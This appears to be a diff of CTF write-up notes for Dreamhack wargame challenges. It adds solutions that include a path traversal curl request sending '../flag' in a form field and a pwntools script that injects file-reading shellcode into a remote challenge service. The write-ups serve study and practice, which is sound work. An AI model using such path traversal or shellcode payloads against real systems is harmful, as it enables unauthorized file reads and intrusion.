@@ -149,7 +149,7 @@ now we know the payload but how do we bypass the weak client side validation? we
 
 ***
 
-## Carve Party
+### Carve Party
 
 To celebrate the Halloween party, we have prepared pumpkins! Click the pumpkin 10000 times to get a flag!
 
@@ -168,6 +168,39 @@ for (let step = 0; step < 100; step++) {
 }
 console.log(String.fromCharCode(...pumpkin));
 ```
+
+***
+
+### ex-reg-ex
+
+Obtain a flag by entering a string in the format required by the question. Flags are in `flag.txt` files and `FLAG` variables.
+
+The flag format is DH {...} This is it.
+
+Basically, if you fulfill the regex&#x20;
+
+```python
+m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', input_val)
+```
+
+you will get the flag. so input&#x20;
+
+```
+draaaaae1am@aaa.abc
+```
+
+can use [https://regex101.com/](https://regex101.com/) to play around. or just cyberchef if im not mistaken.
+
+***
+
+### pathtraversal
+
+An API server for querying user information.\
+Use the Path Traversal vulnerability to obtain the `/api/flag` flag in!
+
+looking at the source code, it shows that the /get\_user is currently in /api/user/{user\_id]. so we just read ../flag
+
+`curl -s -X POST 'http://host8.dreamhack.games:11469/get_info' -d 'userid=../flag`
 
 ***
 
@@ -316,3 +349,56 @@ _BOOL8 __fastcall sub_140001000(_BYTE *a1)
 We just take the number and convert to ascii
 
 <figure><img src="../../.gitbook/assets/{DE744611-1D6E-47AB-8542-3EADF50BEAD4}.png" alt=""><figcaption></figcaption></figure>
+
+## pwnable
+
+### welcome
+
+This problem is given the binary and source code of the service (welcome) running on the server.\
+Click “View connection information” to obtain service information and obtain a flag.\
+Points can be obtained by verifying the content of the flag obtained from the server on the Wargame site.\
+The format of the flag is DH {...} That's it.
+
+**just run the netcat**
+
+***
+
+### shell\_basic
+
+The program that runs the shell code you entered is registered as a service and is working.
+
+`main`Functions other than functions prevent the use of the execve and execveat system calls, and are unrelated to solving.
+
+The location and name of the flag file `/home/shell_basic/flag_name_is_loooooong` is.\
+If you have trouble getting the hang of it, try practicing with the code below first!
+
+**The flag format is`DH{...}`. `DH{`You must `}` also include both and certifications.**
+
+For this, we dont need to exploit anything, we just need to send cat flag payload
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+HOST = "host3.dreamhack.games"
+PORT = 22320
+
+def main():
+    p = remote(HOST, PORT)
+    path = "/home/shell_basic/flag_name_is_loooooong"
+    shellcode = shellcraft.cat(path)
+    shellcode = asm(shellcode)
+
+    p.sendlineafter(b"shellcode: ", shellcode)
+
+    print(p.recvuntil(b"}", timeout=2))
+
+    p.close()
+
+if __name__ == "__main__":
+    main()
+
+```
+
